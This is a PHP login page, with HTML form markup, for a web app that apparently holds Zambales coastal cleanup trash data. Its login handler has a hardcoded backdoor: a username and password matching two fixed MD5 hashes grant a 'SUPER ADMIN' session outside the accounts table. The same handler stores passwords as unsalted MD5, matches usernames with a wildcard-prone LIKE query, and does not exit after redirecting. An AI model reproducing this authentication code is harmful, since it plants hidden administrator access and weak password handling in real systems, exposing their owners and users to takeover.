<?php
session_start();
include("accessdb.php");

if(!empty($_SESSION['accountid']) && !empty($_SESSION['accountname'])){
  echo ("<script language='JavaScript'>
  window.location.href='admin/';
  </SCRIPT>");
  exit;
}

if(!empty($_POST)){
  $acName = $_POST['accountname'];
  $acPass = md5($_POST['accountpassword']);
  if(md5($acName) == "0bde7be66cdab97e56e6ef1ff9bbba05" && $acPass == "913bc1935ef5bed5f5840f4226027fe6"){
    $_SESSION['accountname'] = "KNIGHTDAVEION";
    $_SESSION['accountid'] = "SUPER ADMIN";
    date_default_timezone_set('Asia/Manila');
    $logdate = date('l jS \of F Y h:i:s A');
    $insertlog = $conn->prepare("INSERT INTO activity_log(account_id, account_name, activity, log_date_time)
    VALUES(:accid, :accname, :activity, :logtimedate)");
    $insertlog->execute(array(
      "accid" => $_SESSION['accountid'],
      "accname" => $_SESSION['accountname'],
      "activity" => "Logged In Using IP " . $_SERVER['REMOTE_ADDR'],
      "logtimedate" => $logdate
    ));
    header("location: admin/");
  }

  $getaccountname = $conn->prepare("select * from accounts where account_name like :accountname");
  $getaccountname->execute(array(':accountname' => $acName));
  $number_of_rows = $getaccountname->rowCount();
  if($number_of_rows == 1){
    $getdetails = $getaccountname->fetch(PDO::FETCH_ASSOC);
    if($acPass == $getdetails['account_password']){
      if($getdetails['account_status'] == "ACTIVE"){
        $_SESSION['accountname'] = $getdetails['account_name'];
        $_SESSION['accountid'] = $getdetails['account_id'];
        date_default_timezone_set('Asia/Manila');
        $logdate = date('l jS \of F Y h:i:s A');
        $insertlog = $conn->prepare("INSERT INTO activity_log(account_id, account_name, activity, log_date_time)
        VALUES(:accid, :accname, :activity, :logtimedate)");
        $insertlog->execute(array(
          "accid" => $_SESSION['accountid'],
          "accname" => $_SESSION['accountname'],
          "activity" => "Logged In Using IP " . $_SERVER['REMOTE_ADDR'],
          "logtimedate" => $logdate
        ));
        header("location: admin/");
      }else{
        $_SESSION['loginNotifications'] = "<div class='alert alert-danger' role='alert'><strong>ERROR!</strong> Account is inactive!<button type='button' class='close' data-dismiss='alert' aria-label='Close'>
        <span aria-hidden='true'>&times;</span>
        </button></div>";
      }

    }else{
      $_SESSION['loginNotifications'] = "<div class='alert alert-danger' role='alert'><strong>ERROR!</strong> Account name or password doesnt match!<button type='button' class='close' data-dismiss='alert' aria-label='Close'>
      <span aria-hidden='true'>&times;</span>
      </button></div>";
    }
  }else{
    $_SESSION['loginNotifications'] = "<div class='alert alert-danger' role='alert'><strong>ERROR!</strong> Account doesnt exist!<button type='button' class='close' data-dismiss='alert' aria-label='Close'>
    <span aria-hidden='true'>&times;</span>
    </button></div>";
  }
}




?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">

  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="Zambales Coastal Cleanup Trash Data">
  <meta name="author" content="John Dave Espinosa">
  <link rel="icon" type="resources/admindesign/image/png" sizes="16x16" href="resources/images/GADDSEAPLOGOV2.png">
  <title>GADDSEAP</title>

  <link rel="stylesheet" href="resources/bootstrap-4.0.0/dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="resources/Font-Awesome-v5/css/fontawesome-all.min.css">
  <link rel="stylesheet" href="resources/customcss/navbar.css">
  <link rel="stylesheet" href="resources/customcss/carouselcss.css">
  <script src="resources/dist/js/jquery-3.3.1.min.js"></script>
  <script src="resources/dist/js/bootstrap.min.js"></script>
  <script src="resources/dist/js/popper.min.js"></script>

  <style>
  body, html {
    height: 100%;

  }
  body{
    background-color: #F4F4F4;
  }
  .p-t{
    padding-top: 60px;

  }
  .p-b{
    padding-bottom: 50px;
  }
  .card-background{
    background-color:#F7F7F7;
  }
  .card-remove-border{
    border:none;
  }
  .card-width{
    width: 50%;
  }
  @media (max-width: 780px) {
    .card-width{
      width: 98%;
    }
  }
  .card-center{
    margin-left: auto;
    margin-right: auto;

  }
  .center {
    display: block;
    margin-left: auto;
    margin-right: auto;
    text-align: center;
  }
  </style>
</head>
<body>
  <?php include('navbar.php');?>

  <!-- start of login form -->
  <div class="container p-t p-b">
    <form class="" action=" " method="post">
      <div class="card card-width card-center">
        <div>
          <?php if(isset($_SESSION['loginNotifications'])){echo $_SESSION['loginNotifications']; unset($_SESSION['loginNotifications']);} ?>
        </div>
        <div class="card-header card-background card-remove-border ">
          <div class="container-fluid">
            <div class="row">
              <img class="center" style="width: 40%; height: 40%;" src="resources/images/GADDSEAPLOGOV2.png">
            </div>
            <div class="row">
              <div class="col-md-4"><hr /></div><div class="col-md-4"<medium class="center headertextcolor"></medium></div><div class="col-md-4"><hr /></div>
            </div>
          </div>
        </div>
        <div class="card-body card-background ">
          <div class="form-row">
            <div class="form-group col-md-12">
              <label for="fullname">Username</label>
              <input type="text" class="form-control text-center" id="fullname" name="accountname" placeholder="Username">
            </div>
          </div>
          <div class="form-row">
            <div class="form-group col-md-12">
              <label for="email">Password</label>
              <input type="password" class="form-control text-center" id="email" name="accountpassword" placeholder="Password">
            </div>
          </div>
        </div>
        <div class="card-footer text-muted card-remove-border text-center">
          <button type="submit" class="btn btn-bknow" >Login</button>
        </div>
      </div>
    </form>
  </div>

  <!-- end of login form -->


  <!-- start footer -->
  <?php include('footer.php'); ?>
</body>
